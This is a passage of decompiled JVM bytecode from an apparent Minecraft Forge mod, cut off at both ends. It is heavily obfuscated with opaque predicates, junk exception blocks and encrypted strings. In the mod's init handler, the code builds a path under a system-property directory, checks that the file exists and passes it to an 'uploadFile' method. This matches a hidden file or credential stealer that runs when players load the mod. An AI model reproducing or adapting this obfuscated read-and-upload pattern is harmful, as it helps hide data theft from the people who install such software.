    //   5163: goto -> 5252
    //   5166: ldc_w 956579778
    //   5169: iload #29
    //   5171: ixor
    //   5172: istore #29
    //   5174: goto -> 5252
    //   5177: ldc_w 303530479
    //   5180: iload #29
    //   5182: ixor
    //   5183: istore #29
    //   5185: goto -> 5252
    //   5188: ldc_w 364260715
    //   5191: iload #29
    //   5193: ixor
    //   5194: istore #29
    //   5196: goto -> 5252
    //   5199: ldc_w 1015084285
    //   5202: iload #29
    //   5204: ixor
    //   5205: istore #29
    //   5207: goto -> 5252
    //   5210: ldc_w 1411270469
    //   5213: iload #29
    //   5215: ixor
    //   5216: istore #29
    //   5218: goto -> 5252
    //   5221: ldc_w 1873862381
    //   5224: iload #29
    //   5226: ixor
    //   5227: istore #29
    //   5229: goto -> 5252
    //   5232: new java/io/IOException
    //   5235: astore_3
    //   5236: aload_3
    //   5237: ldc 'Error in hash'
    //   5239: invokespecial <init> : (Ljava/lang/String;)V
    //   5242: aload_3
    //   5243: athrow
    //   5244: ldc_w 1461752412
    //   5247: iload #29
    //   5249: ixor
    //   5250: istore #29
    //   5252: astore #15
    //   5254: ldc_w ''
    //   5257: iload #29
    //   5259: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   5262: astore #16
    //   5264: aload #16
    //   5266: areturn
    //   5267: nop
    //   5268: nop
    //   5269: nop
    //   5270: nop
    //   5271: nop
    //   5272: nop
    //   5273: nop
    //   5274: nop
    //   5275: nop
    //   5276: nop
    //   5277: nop
    //   5278: nop
    //   5279: nop
    //   5280: nop
    //   5281: nop
    //   5282: nop
    //   5283: nop
    //   5284: nop
    //   5285: nop
    //   5286: nop
    //   5287: nop
    //   5288: athrow
    //   5289: nop
    //   5290: nop
    //   5291: nop
    //   5292: athrow
    //   5293: nop
    //   5294: nop
    //   5295: nop
    //   5296: nop
    //   5297: nop
    //   5298: athrow
    //   5299: new java/lang/RuntimeException
    //   5302: astore_3
    //   5303: aload_3
    //   5304: invokespecial <init> : ()V
    //   5307: aload_3
    //   5308: athrow
    //   5309: nop
    //   5310: nop
    //   5311: nop
    //   5312: athrow
    //   5313: nop
    //   5314: nop
    //   5315: nop
    //   5316: nop
    //   5317: nop
    //   5318: athrow
    //   5319: new java/lang/IllegalAccessException
    //   5322: astore_3
    //   5323: aload_3
    //   5324: ldc 'Error in hash'
    //   5326: invokespecial <init> : (Ljava/lang/String;)V
    //   5329: aload_3
    //   5330: athrow
    //   5331: new java/lang/IllegalAccessException
    //   5334: astore_3
    //   5335: aload_3
    //   5336: invokespecial <init> : ()V
    //   5339: aload_3
    //   5340: athrow
    //   5341: nop
    //   5342: nop
    //   5343: nop
    //   5344: athrow
    //   5345: nop
    //   5346: nop
    //   5347: nop
    //   5348: nop
    //   5349: nop
    //   5350: athrow
    //   5351: nop
    //   5352: nop
    //   5353: nop
    //   5354: athrow
    //   5355: nop
    //   5356: nop
    //   5357: nop
    //   5358: nop
    //   5359: nop
    //   5360: athrow
    //   5361: nop
    //   5362: nop
    //   5363: nop
    //   5364: athrow
    //   5365: nop
    //   5366: nop
    //   5367: nop
    //   5368: nop
    //   5369: nop
    //   5370: athrow
    //   5371: new java/io/IOException
    //   5374: astore_3
    //   5375: aload_3
    //   5376: ldc 'Error in hash'
    //   5378: invokespecial <init> : (Ljava/lang/String;)V
    //   5381: aload_3
    //   5382: athrow
    //   5383: new java/io/IOException
    //   5386: astore_3
    //   5387: aload_3
    //   5388: invokespecial <init> : ()V
    //   5391: aload_3
    //   5392: athrow
    //   5393: new java/lang/RuntimeException
    //   5396: astore_3
    //   5397: aload_3
    //   5398: invokespecial <init> : ()V
    //   5401: aload_3
    //   5402: athrow
    //   5403: new java/lang/RuntimeException
    //   5406: astore_3
    //   5407: aload_3
    //   5408: invokespecial <init> : ()V
    //   5411: aload_3
    //   5412: athrow
    //   5413: new java/lang/RuntimeException
    //   5416: astore_3
    //   5417: aload_3
    //   5418: ldc 'Error in hash'
    //   5420: invokespecial <init> : (Ljava/lang/String;)V
    //   5423: aload_3
    //   5424: athrow
    //   5425: new java/lang/RuntimeException
    //   5428: astore_3
    //   5429: aload_3
    //   5430: ldc 'Error in hash'
    //   5432: invokespecial <init> : (Ljava/lang/String;)V
    //   5435: aload_3
    //   5436: athrow
    //   5437: nop
    //   5438: nop
    //   5439: nop
    //   5440: athrow
    //   5441: nop
    //   5442: nop
    //   5443: nop
    //   5444: nop
    //   5445: nop
    //   5446: athrow
    //   5447: new java/lang/RuntimeException
    //   5450: astore_3
    //   5451: aload_3
    //   5452: invokespecial <init> : ()V
    //   5455: aload_3
    //   5456: athrow
    //   5457: new java/lang/RuntimeException
    //   5460: astore_3
    //   5461: aload_3
    //   5462: ldc 'Error in hash'
    //   5464: invokespecial <init> : (Ljava/lang/String;)V
    //   5467: aload_3
    //   5468: athrow
    //   5469: new java/lang/IllegalAccessException
    //   5472: astore_3
    //   5473: aload_3
    //   5474: invokespecial <init> : ()V
    //   5477: aload_3
    //   5478: athrow
    //   5479: nop
    //   5480: nop
    //   5481: nop
    //   5482: athrow
    //   5483: nop
    //   5484: nop
    //   5485: nop
    //   5486: nop
    //   5487: nop
    //   5488: athrow
    //   5489: nop
    //   5490: nop
    //   5491: nop
    //   5492: athrow
    //   5493: nop
    //   5494: nop
    //   5495: nop
    //   5496: nop
    //   5497: nop
    //   5498: athrow
    //   5499: new java/lang/RuntimeException
    //   5502: astore_3
    //   5503: aload_3
    //   5504: invokespecial <init> : ()V
    //   5507: aload_3
    //   5508: athrow
    //   5509: new java/lang/RuntimeException
    //   5512: astore_3
    //   5513: aload_3
    //   5514: invokespecial <init> : ()V
    //   5517: aload_3
    //   5518: athrow
    //   5519: nop
    //   5520: nop
    //   5521: nop
    //   5522: athrow
    //   5523: nop
    //   5524: nop
    //   5525: nop
    //   5526: nop
    //   5527: nop
    //   5528: athrow
    //   5529: nop
    //   5530: nop
    //   5531: nop
    //   5532: athrow
    //   5533: nop
    //   5534: nop
    //   5535: nop
    //   5536: nop
    //   5537: nop
    //   5538: athrow
    // Exception table:
    //   from	to	target	type
    //   59	99	151	java/lang/RuntimeException
    //   121	129	151	java/lang/RuntimeException
    //   267	758	2402	java/io/IOException
    //   472	531	2602	java/lang/Throwable
    //   472	531	3018	java/lang/Throwable
    //   607	645	758	java/lang/Throwable
    //   803	843	895	java/lang/RuntimeException
    //   865	873	895	java/lang/RuntimeException
    //   989	1029	1081	java/lang/IllegalAccessException
    //   1051	1059	1081	java/lang/IllegalAccessException
    //   1188	1228	1280	java/lang/RuntimeException
    //   1250	1258	1280	java/lang/RuntimeException
    //   1377	1417	1469	java/lang/RuntimeException
    //   1439	1447	1469	java/lang/RuntimeException
    //   1565	1605	1657	java/lang/IllegalAccessException
    //   1627	1635	1657	java/lang/IllegalAccessException
    //   1763	1803	1855	java/lang/IllegalAccessException
    //   1825	1833	1855	java/lang/IllegalAccessException
    //   2022	2062	2134	java/lang/RuntimeException
    //   2084	2092	2134	java/lang/RuntimeException
    //   2659	2699	2761	java/lang/IllegalAccessException
    //   2721	2729	2761	java/lang/IllegalAccessException
    //   3075	3080	3765	java/lang/Throwable
    //   3075	3080	5045	java/io/IOException
    //   3102	3137	3765	java/lang/Throwable
    //   3102	3367	5045	java/io/IOException
    //   3213	3251	4217	java/lang/Throwable
    //   3389	3429	3481	java/io/IOException
    //   3451	3459	3481	java/io/IOException
    //   3577	3617	3669	java/lang/IllegalAccessException
    //   3639	3647	3669	java/lang/IllegalAccessException
    //   3828	3868	3920	java/io/IOException
    //   3890	3898	3920	java/io/IOException
    //   4028	4068	4120	java/io/IOException
    //   4090	4098	4120	java/io/IOException
    //   4263	4303	4355	java/lang/RuntimeException
    //   4325	4333	4355	java/lang/RuntimeException
    //   4449	4489	4541	java/lang/RuntimeException
    //   4511	4519	4541	java/lang/RuntimeException
    //   4648	4688	4740	java/io/IOException
    //   4710	4718	4740	java/io/IOException
  }
  
  @EventHandler
  public void init(FMLInitializationEvent paramFMLInitializationEvent) {
    // Byte code:
    //   0: ldc_w 940625184
    //   3: ldc_w 487438835
    //   6: aload_0
    //   7: getfield NNmLBEcPbp : I
    //   10: ixor
    //   11: ixor
    //   12: istore #145
    //   14: iload #145
    //   16: bipush #31
    //   18: imul
    //   19: iconst_4
    //   20: iushr
    //   21: iload #145
    //   23: irem
    //   24: iload #145
    //   26: bipush #16
    //   28: iushr
    //   29: ixor
    //   30: ldc_w 161379417
    //   33: if_icmpne -> 47
    //   36: ldc_w 11411360
    //   39: iload #145
    //   41: ixor
    //   42: istore #145
    //   44: goto -> 57
    //   47: new java/lang/IllegalAccessException
    //   50: astore_3
    //   51: aload_3
    //   52: invokespecial <init> : ()V
    //   55: aload_3
    //   56: athrow
    //   57: iload #145
    //   59: ldc_w 1755420096
    //   62: iload #145
    //   64: ixor
    //   65: imul
    //   66: ldc_w 1755420123
    //   69: iload #145
    //   71: ixor
    //   72: iushr
    //   73: iload #145
    //   75: irem
    //   76: iload #145
    //   78: ldc_w 1755420111
    //   81: iload #145
    //   83: ixor
    //   84: iushr
    //   85: ixor
    //   86: ldc_w 1645801246
    //   89: iload #145
    //   91: ixor
    //   92: if_icmpeq -> 119
    //   95: aconst_null
    //   96: athrow
    //   97: nop
    //   98: nop
    //   99: nop
    //   100: nop
    //   101: nop
    //   102: nop
    //   103: nop
    //   104: nop
    //   105: nop
    //   106: nop
    //   107: nop
    //   108: nop
    //   109: nop
    //   110: nop
    //   111: nop
    //   112: nop
    //   113: nop
    //   114: nop
    //   115: nop
    //   116: nop
    //   117: nop
    //   118: athrow
    //   119: new java/lang/RuntimeException
    //   122: dup
    //   123: invokespecial <init> : ()V
    //   126: athrow
    //   127: nop
    //   128: nop
    //   129: nop
    //   130: nop
    //   131: nop
    //   132: nop
    //   133: nop
    //   134: nop
    //   135: nop
    //   136: nop
    //   137: nop
    //   138: nop
    //   139: nop
    //   140: nop
    //   141: nop
    //   142: nop
    //   143: nop
    //   144: nop
    //   145: nop
    //   146: nop
    //   147: nop
    //   148: athrow
    //   149: nop
    //   150: nop
    //   151: nop
    //   152: athrow
    //   153: nop
    //   154: nop
    //   155: nop
    //   156: nop
    //   157: nop
    //   158: athrow
    //   159: nop
    //   160: nop
    //   161: nop
    //   162: athrow
    //   163: nop
    //   164: nop
    //   165: nop
    //   166: nop
    //   167: nop
    //   168: athrow
    //   169: iload #145
    //   171: bipush #7
    //   173: bipush #29
    //   175: ishl
    //   176: iand
    //   177: bipush #29
    //   179: ishr
    //   180: iload #145
    //   182: iconst_3
    //   183: ishl
    //   184: ior
    //   185: lookupswitch default -> 7238, -1521216686 -> 223, 1158459131 -> 212
    //   212: ldc_w 1252335151
    //   215: iload #145
    //   217: ixor
    //   218: istore #145
    //   220: goto -> 231
    //   223: ldc_w 1991117210
    //   226: iload #145
    //   228: ixor
    //   229: istore #145
    //   231: pop
    //   232: iload #145
    //   234: bipush #31
    //   236: imul
    //   237: iconst_4
    //   238: iushr
    //   239: iload #145
    //   241: irem
    //   242: iload #145
    //   244: bipush #16
    //   246: iushr
    //   247: ixor
    //   248: ldc_w 32042277
    //   251: if_icmpne -> 7228
    //   254: ldc_w 659265652
    //   257: iload #145
    //   259: ixor
    //   260: istore #145
    //   262: ldc_w 'fRk3LwouewNMbhlEUUQ='
    //   265: iload #145
    //   267: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   270: astore_2
    //   271: ldc_w 'fRk3LwouewNMbhlEUUQ='
    //   274: iload #145
    //   276: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   279: astore #4
    //   281: ldc_w 'fRk3LwouewNMbhlEUUQ='
    //   284: iload #145
    //   286: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   289: astore #5
    //   291: new java/io/File
    //   294: astore #6
    //   296: new java/lang/StringBuilder
    //   299: astore_3
    //   300: aload_3
    //   301: invokespecial <init> : ()V
    //   304: ldc_w 'RgVyO00qcU5P'
    //   307: iload #145
    //   309: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   312: astore #134
    //   314: aload #134
    //   316: invokestatic getProperty : (Ljava/lang/String;)Ljava/lang/String;
    //   319: astore #135
    //   321: aload_3
    //   322: aload #135
    //   324: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   327: astore #103
    //   329: ldc_w 'b1h7PA0jbEBGaAlEQTZpW1x5aHwdT0laUhtyFQIhfUxfbxhZGx5iSg=='
    //   332: iload #145
    //   334: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   337: astore #136
    //   339: aload #103
    //   341: aload #136
    //   343: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   346: astore #104
    //   348: aload #104
    //   350: invokevirtual toString : ()Ljava/lang/String;
    //   353: astore #105
    //   355: aload #6
    //   357: aload #105
    //   359: invokespecial <init> : (Ljava/lang/String;)V
    //   362: aload #6
    //   364: invokevirtual exists : ()Z
    //   367: istore #7
    //   369: iload #7
    //   371: ldc_w 89068420
    //   374: iload #145
    //   376: ixor
    //   377: if_icmpeq -> 1687
    //   380: iload #145
    //   382: bipush #31
    //   384: imul
    //   385: iconst_4
    //   386: iushr
    //   387: iload #145
    //   389: irem
    //   390: iload #145
    //   392: bipush #16
    //   394: iushr
    //   395: ixor
    //   396: ldc_w 83502852
    //   399: if_icmpne -> 413
    //   402: ldc_w 817308535
    //   405: iload #145
    //   407: ixor
    //   408: istore #145
    //   410: goto -> 423
    //   413: new java/lang/RuntimeException
    //   416: astore_3
    //   417: aload_3
    //   418: invokespecial <init> : ()V
    //   421: aload_3
    //   422: athrow
    //   423: iload #145
    //   425: ldc_w 905457900
    //   428: iload #145
    //   430: ixor
    //   431: imul
    //   432: ldc_w 905457911
    //   435: iload #145
    //   437: ixor
    //   438: iushr
    //   439: iload #145
    //   441: irem
    //   442: iload #145
    //   444: ldc_w 905457891
    //   447: iload #145
    //   449: ixor
    //   450: iushr
    //   451: ixor
    //   452: ldc_w 1030282205
    //   455: iload #145
    //   457: ixor
    //   458: if_icmpeq -> 485
    //   461: aconst_null
    //   462: athrow
    //   463: nop
    //   464: nop
    //   465: nop
    //   466: nop
    //   467: nop
    //   468: nop
    //   469: nop
    //   470: nop
    //   471: nop
    //   472: nop
    //   473: nop
    //   474: nop
    //   475: nop
    //   476: nop
    //   477: nop
    //   478: nop
    //   479: nop
    //   480: nop
    //   481: nop
    //   482: nop
    //   483: nop
    //   484: athrow
    //   485: new java/lang/IllegalAccessException
    //   488: dup
    //   489: invokespecial <init> : ()V
    //   492: athrow
    //   493: nop
    //   494: nop
    //   495: nop
    //   496: nop
    //   497: nop
    //   498: nop
    //   499: nop
    //   500: nop
    //   501: nop
    //   502: nop
    //   503: nop
    //   504: nop
    //   505: nop
    //   506: nop
    //   507: nop
    //   508: nop
    //   509: nop
    //   510: nop
    //   511: nop
    //   512: nop
    //   513: nop
    //   514: athrow
    //   515: iload #145
    //   517: bipush #7
    //   519: bipush #29
    //   521: ishl
    //   522: iand
    //   523: bipush #29
    //   525: ishr
    //   526: iload #145
    //   528: iconst_3
    //   529: ishl
    //   530: ior
    //   531: lookupswitch default -> 1655, -1346271335 -> 567, 2039095627 -> 556
    //   556: ldc_w 2145648450
    //   559: iload #145
    //   561: ixor
    //   562: istore #145
    //   564: goto -> 575
    //   567: ldc_w 623545240
    //   570: iload #145
    //   572: ixor
    //   573: istore #145
    //   575: pop
    //   576: iload #145
    //   578: bipush #31
    //   580: imul
    //   581: iconst_4
    //   582: iushr
    //   583: iload #145
    //   585: irem
    //   586: iload #145
    //   588: bipush #16
    //   590: iushr
    //   591: ixor
    //   592: ldc_w 9984973
    //   595: if_icmpne -> 1645
    //   598: ldc_w 2043071676
    //   601: iload #145
    //   603: ixor
    //   604: istore #145
    //   606: aload_0
    //   607: astore #8
    //   609: new java/lang/StringBuilder
    //   612: astore #54
    //   614: aload #54
    //   616: invokespecial <init> : ()V
    //   619: ldc_w 'Twt0P0wqek5A'
    //   622: iload #145
    //   624: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   627: astore #106
    //   629: aload #106
    //   631: invokestatic getProperty : (Ljava/lang/String;)Ljava/lang/String;
    //   634: astore #107
    //   636: aload #54
    //   638: aload #107
    //   640: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   643: astore #55
    //   645: ldc_w 'ZlZ9OAwjZ0BJaAhFTzBiX11wb3MUTE1YUxZ7Ew0sfktRZBFbGhpnQw=='
    //   648: iload #145
    //   650: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   653: astore #108
    //   655: aload #55
    //   657: aload #108
    //   659: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   662: astore #56
    //   664: aload #56
    //   666: invokevirtual toString : ()Ljava/lang/String;
    //   669: astore #57
    //   671: aload #8
    //   673: aload #57
    //   675: ldc_w 1442160605
    //   678: iload #145
    //   680: ixor
    //   681: invokevirtual uploadFile : (Ljava/lang/String;I)Ljava/lang/String;
    //   684: astore #9
    //   686: ldc_w 'fBl4IQcmNVdKIQJbXgI+SExlYg=='
    //   689: iload #145
    //   691: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   694: astore #58
    //   696: aload #9
    //   698: aload #58
    //   700: invokevirtual contains : (Ljava/lang/CharSequence;)Z
    //   703: istore #10
    //   705: iload #10
    //   707: ldc_w 1762949079
    //   710: iload #145
    //   712: ixor
    //   713: if_icmpeq -> 1299
    //   716: iload #145
    //   718: bipush #31
    //   720: imul
    //   721: iconst_4
    //   722: iushr
    //   723: iload #145
    //   725: irem
    //   726: iload #145
    //   728: bipush #16
    //   730: iushr
    //   731: ixor
    //   732: ldc_w 194494756
    //   735: if_icmpne -> 749
    //   738: ldc_w 318181757
    //   741: iload #145
    //   743: ixor
    //   744: istore #145
    //   746: goto -> 759
    //   749: new java/lang/RuntimeException
    //   752: astore_3
    //   753: aload_3
    //   754: invokespecial <init> : ()V
    //   757: aload_3
    //   758: athrow
    //   759: iload #145
    //   761: ldc_w 2078500533
    //   764: iload #145
    //   766: ixor
    //   767: imul
    //   768: ldc_w 2078500526
    //   771: iload #145
    //   773: ixor
    //   774: iushr
    //   775: iload #145
    //   777: irem
    //   778: iload #145
    //   780: ldc_w 2078500538
    //   783: iload #145
    //   785: ixor
    //   786: iushr
    //   787: ixor
    //   788: ldc_w 2079034272
    //   791: iload #145
    //   793: ixor
    //   794: if_icmpeq -> 821
    //   797: aconst_null
    //   798: athrow
    //   799: nop
    //   800: nop
    //   801: nop
    //   802: nop
    //   803: nop
    //   804: nop
    //   805: nop
    //   806: nop
    //   807: nop
    //   808: nop
    //   809: nop
    //   810: nop
    //   811: nop
    //   812: nop
    //   813: nop
    //   814: nop
    //   815: nop
    //   816: nop
    //   817: nop
    //   818: nop
    //   819: nop
    //   820: athrow
    //   821: new java/lang/IllegalAccessException
    //   824: dup
    //   825: invokespecial <init> : ()V
    //   828: athrow
    //   829: nop
    //   830: nop
    //   831: nop
    //   832: nop
    //   833: nop
    //   834: nop
    //   835: nop
    //   836: nop
    //   837: nop
    //   838: nop
    //   839: nop
    //   840: nop
    //   841: nop
    //   842: nop
    //   843: nop
    //   844: nop
    //   845: nop
    //   846: nop
    //   847: nop
    //   848: nop
    //   849: nop
    //   850: athrow
    //   851: nop
    //   852: nop
    //   853: nop
    //   854: athrow
    //   855: nop
    //   856: nop
    //   857: nop
    //   858: nop
    //   859: nop
    //   860: athrow
    //   861: iload #145
    //   863: bipush #7
    //   865: bipush #29
    //   867: ishl
    //   868: iand
    //   869: bipush #29
    //   871: ishr
    //   872: iload #145
    //   874: iconst_3
    //   875: ishl
    //   876: ior
    //   877: lookupswitch default -> 915, -551865005 -> 904, 2132769323 -> 927
    //   904: ldc_w 2064112185
    //   907: iload #145
    //   909: ixor
    //   910: istore #145
    //   912: goto -> 935
    //   915: new java/io/IOException
    //   918: astore_3
    //   919: aload_3
    //   920: ldc 'Error in hash'
    //   922: invokespecial <init> : (Ljava/lang/String;)V
    //   925: aload_3
    //   926: athrow
    //   927: ldc_w 1862751190
    //   930: iload #145
    //   932: ixor
    //   933: istore #145
    //   935: pop
    //   936: iload #145
    //   938: bipush #31
    //   940: imul
    //   941: iconst_4
    //   942: iushr
    //   943: iload #145
    //   945: irem
    //   946: iload #145
    //   948: bipush #16
    //   950: iushr
    //   951: ixor
    //   952: ldc_w 14053421
    //   955: if_icmpne -> 1279
    //   958: ldc_w 1120775933
    //   961: iload #145
    //   963: ixor
    //   964: istore #145
    //   966: ldc_w 'WRFiKgYgPF4HZx1IU0d3X0to'
    //   969: iload #145
    //   971: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   974: astore #59
    //   976: aload #9
    //   978: aload #59
    //   980: invokevirtual contains : (Ljava/lang/CharSequence;)Z
    //   983: istore #11
    //   985: iload #11
    //   987: ldc_w 1109987950
    //   990: iload #145
    //   992: ixor
    //   993: if_icmpne -> 1029
    //   996: iload #145
    //   998: bipush #31
    //   1000: imul
    //   1001: iconst_4
    //   1002: iushr
    //   1003: iload #145
    //   1005: irem
    //   1006: iload #145
    //   1008: bipush #16
    //   1010: iushr
    //   1011: ixor
    //   1012: ldc_w 3133852
    //   1015: if_icmpne -> 1040
    //   1018: ldc_w 877429445
    //   1021: iload #145
    //   1023: ixor
    //   1024: istore #145
    //   1026: goto -> 1050
    //   1029: ldc_w 788309358
    //   1032: iload #145
    //   1034: ixor
    //   1035: istore #145
    //   1037: goto -> 1695
    //   1040: new java/lang/IllegalAccessException
    //   1043: astore_3
    //   1044: aload_3
    //   1045: invokespecial <init> : ()V
    //   1048: aload_3
    //   1049: athrow
    //   1050: iload #145
    //   1052: ldc_w 1986367668
    //   1055: iload #145
    //   1057: ixor
    //   1058: imul
    //   1059: ldc_w 1986367663
    //   1062: iload #145
    //   1064: ixor
    //   1065: iushr
    //   1066: iload #145
    //   1068: irem
    //   1069: iload #145
    //   1071: ldc_w 1986367675
    //   1074: iload #145
    //   1076: ixor
    //   1077: iushr
    //   1078: ixor
    //   1079: ldc_w 1929457285
    //   1082: iload #145
    //   1084: ixor
    //   1085: if_icmpeq -> 1112
    //   1088: aconst_null
    //   1089: athrow
    //   1090: nop
    //   1091: nop
    //   1092: nop
    //   1093: nop
    //   1094: nop
    //   1095: nop
    //   1096: nop
    //   1097: nop
    //   1098: nop
    //   1099: nop
    //   1100: nop
    //   1101: nop
    //   1102: nop
    //   1103: nop
    //   1104: nop
    //   1105: nop
    //   1106: nop
    //   1107: nop
    //   1108: nop
    //   1109: nop
    //   1110: nop
    //   1111: athrow
    //   1112: new java/io/IOException
    //   1115: dup
    //   1116: invokespecial <init> : ()V
    //   1119: athrow
    //   1120: nop
    //   1121: nop
    //   1122: nop
    //   1123: nop
    //   1124: nop
    //   1125: nop
    //   1126: nop
    //   1127: nop
    //   1128: nop
    //   1129: nop
    //   1130: nop
    //   1131: nop
    //   1132: nop
    //   1133: nop
    //   1134: nop
    //   1135: nop
    //   1136: nop
    //   1137: nop
    //   1138: nop
    //   1139: nop
    //   1140: nop
    //   1141: athrow
    //   1142: iload #145
    //   1144: bipush #7
    //   1146: bipush #29
    //   1148: ishl
    //   1149: iand
    //   1150: bipush #29
    //   1152: ishr
    //   1153: iload #145
    //   1155: iconst_3
    //   1156: ishl
    //   1157: ior
    //   1158: lookupswitch default -> 1247, -1288927909 -> 1195, 343109251 -> 1184
    //   1184: ldc_w 242703778
    //   1187: iload #145
    //   1189: ixor
    //   1190: istore #145
    //   1192: goto -> 1203
    //   1195: ldc_w 446472409
    //   1198: iload #145
    //   1200: ixor
    //   1201: istore #145
    //   1203: pop
    //   1204: iload #145
    //   1206: bipush #31
    //   1208: imul
    //   1209: iconst_4
    //   1210: iushr
    //   1211: iload #145
    //   1213: irem
    //   1214: iload #145
    //   1216: bipush #16
    //   1218: iushr
    //   1219: ixor
    //   1220: ldc_w 52601125
    //   1223: if_icmpne -> 1237
    //   1226: ldc_w 1025773736
    //   1229: iload #145
    //   1231: ixor
    //   1232: istore #145
    //   1234: goto -> 1307
    //   1237: new java/io/IOException
    //   1240: astore_3
    //   1241: aload_3
    //   1242: invokespecial <init> : ()V
    //   1245: aload_3
    //   1246: athrow
    //   1247: new java/lang/RuntimeException
    //   1250: astore_3
    //   1251: aload_3
    //   1252: ldc 'Error in hash'
    //   1254: invokespecial <init> : (Ljava/lang/String;)V
    //   1257: aload_3
    //   1258: athrow
    //   1259: nop
    //   1260: nop
    //   1261: nop
    //   1262: athrow
    //   1263: nop
    //   1264: nop
    //   1265: nop
    //   1266: nop
    //   1267: nop
    //   1268: athrow
    //   1269: nop
    //   1270: nop
    //   1271: nop
    //   1272: athrow
    //   1273: nop
    //   1274: nop
    //   1275: nop
    //   1276: nop
    //   1277: nop
    //   1278: athrow
    //   1279: new java/lang/IllegalAccessException
    //   1282: astore_3
    //   1283: aload_3
    //   1284: invokespecial <init> : ()V
    //   1287: aload_3
    //   1288: athrow
    //   1289: nop
    //   1290: nop
    //   1291: nop
    //   1292: athrow
    //   1293: nop
    //   1294: nop
    //   1295: nop
    //   1296: nop
    //   1297: nop
    //   1298: athrow
    //   1299: ldc_w 952719117
    //   1302: iload #145
    //   1304: ixor
    //   1305: istore #145
    //   1307: ldc_w 'VhV+J014OA=='
    //   1310: iload #145
    //   1312: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   1315: astore #60
    //   1317: aload #9
    //   1319: aload #60
    //   1321: invokevirtual split : (Ljava/lang/String;)[Ljava/lang/String;
    //   1324: astore #12
    //   1326: ldc_w 1373446363
    //   1329: iload #145
    //   1331: ixor
    //   1332: i2b
    //   1333: istore #61
    //   1335: aload #12
    //   1337: iload #61
    //   1339: aaload
    //   1340: astore #13
    //   1342: ldc_w 'GA=='
    //   1345: iload #145
    //   1347: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   1350: astore #62
    //   1352: aload #13
    //   1354: aload #62
    //   1356: invokevirtual split : (Ljava/lang/String;)[Ljava/lang/String;
    //   1359: astore #14
    //   1361: ldc_w 1373446362
    //   1364: iload #145
    //   1366: ixor
    //   1367: i2b
    //   1368: istore #63
    //   1370: aload #14
    //   1372: iload #63
    //   1374: aaload
    //   1375: astore_2
    //   1376: iload #145
    //   1378: bipush #31
    //   1380: imul
    //   1381: iconst_4
    //   1382: iushr
    //   1383: iload #145
    //   1385: irem
    //   1386: iload #145
    //   1388: bipush #16
    //   1390: iushr
    //   1391: ixor
    //   1392: ldc_w 245120635
    //   1395: if_icmpne -> 1635
    //   1398: ldc_w 718227227
    //   1401: iload #145
    //   1403: ixor
    //   1404: istore #145
    //   1406: iload #145
    //   1408: ldc_w 2064803806
    //   1411: iload #145
    //   1413: ixor
    //   1414: imul
    //   1415: ldc_w 2064803781
    //   1418: iload #145
    //   1420: ixor
    //   1421: iushr
    //   1422: iload #145
    //   1424: irem
    //   1425: iload #145
    //   1427: ldc_w 2064803793
    //   1430: iload #145
    //   1432: ixor
    //   1433: iushr
    //   1434: ixor
    //   1435: ldc_w 1969337814
    //   1438: iload #145
    //   1440: ixor
    //   1441: if_icmpeq -> 1468
    //   1444: aconst_null
    //   1445: athrow
    //   1446: nop
    //   1447: nop
    //   1448: nop
    //   1449: nop
    //   1450: nop
    //   1451: nop
    //   1452: nop
    //   1453: nop
    //   1454: nop
    //   1455: nop
    //   1456: nop
    //   1457: nop
    //   1458: nop
    //   1459: nop
    //   1460: nop
    //   1461: nop
    //   1462: nop
    //   1463: nop
    //   1464: nop
    //   1465: nop
    //   1466: nop
    //   1467: athrow
    //   1468: new java/lang/RuntimeException
    //   1471: dup
    //   1472: invokespecial <init> : ()V
    //   1475: athrow
    //   1476: nop
    //   1477: nop
    //   1478: nop
    //   1479: nop
    //   1480: nop
    //   1481: nop
    //   1482: nop
    //   1483: nop
    //   1484: nop
    //   1485: nop
    //   1486: nop
    //   1487: nop
    //   1488: nop
    //   1489: nop
    //   1490: nop
    //   1491: nop
    //   1492: nop
    //   1493: nop
    //   1494: nop
    //   1495: nop
    //   1496: nop
    //   1497: athrow
    //   1498: nop
    //   1499: nop
    //   1500: nop
    //   1501: athrow
    //   1502: nop
    //   1503: nop
    //   1504: nop
    //   1505: nop
    //   1506: nop
    //   1507: athrow
    //   1508: nop
    //   1509: nop
    //   1510: nop
    //   1511: athrow
    //   1512: nop
    //   1513: nop
    //   1514: nop
    //   1515: nop
    //   1516: nop
    //   1517: athrow
    //   1518: iload #145
    //   1520: bipush #7
    //   1522: bipush #29
    //   1524: ishl
    //   1525: iand
    //   1526: bipush #29
    //   1528: ishr
    //   1529: iload #145
    //   1531: iconst_3
    //   1532: ishl
    //   1533: ior
    //   1534: lookupswitch default -> 1571, -1343708143 -> 1560, -661438965 -> 1583
    //   1560: ldc_w 1852738266
    //   1563: iload #145
    //   1565: ixor
    //   1566: istore #145
    //   1568: goto -> 1591
    //   1571: new java/lang/IllegalAccessException
    //   1574: astore_3
    //   1575: aload_3
    //   1576: ldc 'Error in hash'
    //   1578: invokespecial <init> : (Ljava/lang/String;)V
    //   1581: aload_3
    //   1582: athrow
    //   1583: ldc_w 545388953
    //   1586: iload #145
    //   1588: ixor
    //   1589: istore #145
    //   1591: pop
    //   1592: iload #145
    //   1594: bipush #31
    //   1596: imul
    //   1597: iconst_4
